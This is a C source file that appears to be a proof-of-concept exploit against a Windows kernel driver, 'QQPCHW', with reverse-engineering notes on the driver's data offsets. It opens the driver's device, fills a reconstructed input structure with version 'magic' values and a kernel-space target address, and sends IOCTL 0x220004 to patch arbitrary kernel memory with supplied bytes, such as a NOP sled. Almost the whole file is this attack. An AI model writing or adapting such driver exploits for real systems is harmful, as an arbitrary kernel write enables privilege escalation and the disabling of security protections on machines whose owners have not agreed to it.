#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

// Define the IOCTL code 0x220004
#define IOCTL_QQPCHW_WRITE 0x220004

/* 
# .data:00000000000147EC dword_147EC     dd ?                    ; DATA XREF: NotifyRoutine:loc_1149A↑r
# .data:00000000000147E8 dword_147E8     dd ?                    ; DATA XREF: NotifyRoutine+33↑r
# .data:0000000000014810 dword_14810     dd ?                    ; DATA XREF: sub_12120+44↑w
# .data:00000000000147E4 dword_147E4     dd ?                    ; DATA XREF: NotifyRoutine+3C↑r
# .data:00000000000147E0 dword_147E0     dd ?                    ; DATA XREF: sub_12120+79↑w

.text	0000000000011000	0000000000013000	R	.	X	.	L	para	0001	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.idata	0000000000013000	0000000000013230	R	.	.	.	L	para	0007	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.rdata	0000000000013230	0000000000014000	R	.	.	.	L	para	0002	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.data	0000000000014000	0000000000015000	R	W	.	.	L	para	0003	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.pdata	0000000000015000	0000000000016000	R	.	.	.	L	para	0004	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
PAGE	0000000000016000	0000000000018000	R	.	X	.	L	para	0005	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
INIT	0000000000018000	0000000000019000	R	W	X	.	L	para	0006	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF 

dword_147EC Value ... .. ..
(Driver Module Live Base) + (0x00000000000147EC - 0x0000000000000000)

dword_147EC = Major Version (e.g., 10)
dword_147E8 = Minor Version (e.g., 0)
dword_14810 = Build Number (e.g., 19041 or 22621)
dword_147E4 = Service Pack / Version Extra (v4)
dword_147E0 = NT Build / Product type from PsGetVersion
*/

// Reconstructed input structure based on the driver layout
#pragma pack(push, 1)
typedef struct _QQPCHW_PAYLOAD {
    ULONG Magic1;         // Offset 0x00 (must match dword_147EC)
    ULONG Magic2;         // Offset 0x04 (must match dword_147E8)
    ULONG Magic3;         // Offset 0x08 (must match dword_14810)
    ULONG Magic4;         // Offset 0x0C (must match dword_147E4)
    ULONG Magic5;         // Offset 0x10 (must match dword_147E0)
    UCHAR EnableMapping;  // Offset 0x14 (non-zero to trigger mapping)
    UCHAR Reserved[3];    // Padding to align pointers
    ULONGLONG TargetAddress; // Offset 0x18 (Address X)
    ULONGLONG SourceBuffer;  // Offset 0x20 (Pointer to data bytes)
    UCHAR SigLength;      // Offset 0x28 (Length of signature check)
    UCHAR SecondaryFlag;  // Offset 0x29 (Enables second validation stage)
    UCHAR InlineData[256];// Offset 0x2A+ (Inline signature / data bytes)
} QQPCHW_PAYLOAD, *PQQPCHW_PAYLOAD;
#pragma pack(pop)

int main() {
    // 1. Open a handle to the driver device
    HANDLE hDevice = CreateFileA(
        "\\\\.\\QQPCHW", // Or whatever symbolic link the driver creates
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open driver handle: %d\n", GetLastError());
        return 1;
    }

    // 2. Prepare the payload structure
    QQPCHW_PAYLOAD payload = { 0 };

    // Fill in the exact magic numbers required by the driver (retrieved via reverse engineering)
    payload.Magic1 = 0x12345678; // Replace with actual dword_147EC value
    payload.Magic2 = 0x87654321; // Replace with actual dword_147E8 value
    payload.Magic3 = 0x11223344; // Replace with actual dword_14810 value
    payload.Magic4 = 0x55667788; // Replace with actual dword_147E4 value
    payload.Magic5 = 0x99AABBCC; // Replace with actual dword_147E0 value

    payload.EnableMapping = 1;                     // Enable execution flag
    payload.TargetAddress = 0xFFFFF80000000000;   // Address X (Target memory address)
    payload.SigLength      = 4;                      // Signature comparison length
    payload.SecondaryFlag = 1;                      // Enable second stage write/validation

    // Data bytes you want to write (or match)
    unsigned char bytesToWrite[] = { 0x90, 0x90, 0x90, 0x90 }; // e.g., NOP sled
    payload.SourceBuffer = (ULONGLONG)bytesToWrite;

    DWORD bytesReturned = 0;

    // 3. Send the IOCTL request to the driver
    BOOL success = DeviceIoControl(
        hDevice,
        IOCTL_QQPCHW_WRITE,
        &payload,
        sizeof(payload),
        &payload,
        sizeof(payload),
        &bytesReturned,
        NULL
    );

    if (success) {
        printf("IOCTL sent successfully. Memory patched.\n");
    } else {
        printf("IOCTL failed with error: %d\n", GetLastError());
    }

    CloseHandle(hDevice);
    return 0;
}